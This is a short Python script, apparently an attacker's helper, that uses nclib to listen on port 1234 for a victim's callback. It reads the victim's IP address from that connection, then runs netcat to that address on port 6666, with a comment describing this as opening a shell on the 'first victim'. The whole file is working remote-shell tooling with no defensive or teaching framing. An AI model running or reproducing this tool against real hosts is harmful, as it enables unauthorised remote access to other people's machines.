import nclib
from subprocess import call
import time

print "starting listener\n"
LISTEN_PORT = 1234
nc = nclib.Netcat(listen=('192.168.1.3',LISTEN_PORT),log_send=False,log_recv=False, log_yield=True)

print "starting get victim ip\n"
data = nc.recv(4096)
#open shell for first victim\
openshell = "netcat " + data + " 6666"
print "running:" + openshell
call(openshell.split(" "))
